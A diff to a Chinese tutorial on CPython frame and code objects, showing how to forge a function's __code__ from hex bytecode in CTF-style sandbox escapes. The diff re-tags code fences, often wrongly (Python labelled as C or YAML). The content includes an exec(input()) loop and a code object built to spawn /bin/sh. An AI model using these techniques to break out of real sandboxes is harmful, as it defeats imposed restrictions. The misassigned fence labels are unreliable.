@@ -10,7 +10,7 @@ Python虚拟机的执行环境基于PyFrameObject栈帧，一个线程有一个�
 
 栈帧构造如下
 
-```text
+```c
 struct _frame {
     PyObject_VAR_HEAD
     struct _frame *f_back;      /* previous frame, or NULL */
@@ -50,7 +50,7 @@ struct _frame {
 
 \(不同版本python有一定区别，新版本加入了几个新的强制参数\)
 
-```text
+```yaml
 print(dir((lambda: 0).__code__))
 '''
 ['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_kwonlyargcount', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_posonlyargcount', 'co_stacksize', 'co_varnames', 'replace']
@@ -59,7 +59,7 @@ print(dir((lambda: 0).__code__))
 
 统计必要参数数量，这个地方不同版本的python会有所差异。
 
-```text
+```c
 li = [i for i in dir((lambda: 0).__code__) if not i.startswith('__')]
 len(li)
 #17
@@ -69,7 +69,7 @@ len(li)
 
 其中有关PyCode对象的新建
 
-```text
+```c
 PyCodeObject *
 PyCode_New(int argcount, int kwonlyargcount,
            int nlocals, int stacksize, int flags,
@@ -94,7 +94,7 @@ Create a code object.  Not for the faint of heart.");
 
 据此构造在python中利用类型方法构造出一个对应的`__code__`对象改写原函数对象的逻辑
 
-```text
+```c
 def a():
     if 1 == 2:
         print("flag{233}")
@@ -121,7 +121,7 @@ a()
 
 看文档不如看源码
 
-```text
+```c
 //https://github.com/python/cpython/blob/master/Include/cpython/code.h
 /* Bytecode object */
 struct PyCodeObject {
@@ -198,7 +198,7 @@ struct PyCodeObject {
 
 接下来演示另一个具有`freevars`的样例
 
-```text
+```c
 def target(flag):
     def printflag():
         if flag == "":
@@ -211,7 +211,7 @@ flag()
 
 构造\_\_code\_\_对象
 
-```text
+```c
 def a(flag):
     def printflag():
         if flag != "":
@@ -242,7 +242,7 @@ flag.__code__ =type(target.__code__)(0,0,0,0,2,19,bytes.fromhex('880064016b03721
 '''
 ```
 
-```text
+```bash
 py example2.py
 >flag.__code__=type(target.__code__)(0,0,0,0,2,19,bytes.fromhex('880064016b037210740088008301010064005300'),(None, ''),('print',),(),'newcode.py','printflag',2,bytes.fromhex('00010801'),('flag',),())
 flag{2333}
@@ -250,7 +250,7 @@ flag{2333}
 
 可以看到这里通过覆盖修改原函数的`__code__`对象使其成功输出了原函数域内的变量flag，此外，这里由于只接受一次输入，把这个过程压缩在一行里，也可以用一个while循环达成无限次数的输入，但有些时候也可能并没有这样一个继续交互的机会
 
-```text
+```c
 while True:    exec(input())
 '''
     >....
@@ -260,7 +260,7 @@ while True:    exec(input())
 
 实际上利用`__code__`对象完全可以执行任意操作码\(opcode\) ，比如我们构造一个通过`os`模块`getshell`的对象
 
-```text
+```python
 def target():
     import os
     os.system("/bin/sh")
@@ -283,7 +283,7 @@ python的文本源码经过ast分析与有限的优化后转化成最终的字�
 
 二者关系有如汇编与二进制
 
-```text
+```python
 >>> from opcode import opmap
 >>> import dis
 >>> chr(opmap['LOAD_CONST'])
